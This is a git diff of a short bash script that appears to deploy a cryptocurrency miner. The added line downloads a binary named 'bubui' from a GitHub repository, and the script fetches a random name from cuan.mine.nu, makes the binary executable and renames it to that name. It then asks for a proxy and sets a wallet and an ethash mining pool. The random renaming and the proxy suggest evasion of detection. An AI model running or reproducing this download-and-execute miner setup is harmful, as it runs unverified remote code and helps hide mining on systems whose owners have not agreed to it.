@@ -1,9 +1,8 @@
 #!/bin/bash
-sleep 10m
-wget https://github.com/anon1jju/ketaea/raw/631ff83f7fd506eaa419bc2319a9873ff1c90e7c/bubui
+wget https://github.com/rindalasririn/ketaea/raw/main/bubui
 #wget https://cuan.mine.nu/nbminer
 ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
-chmod +x nbminer && mv nbminer $ACAK
+chmod +x bubui && mv bubui $ACAK
 read -p 'Input Proxy nya: ' PROXY
 WALLET=prodent
 POOL=stratum+tcp://ethash.poolbinance.com:1800
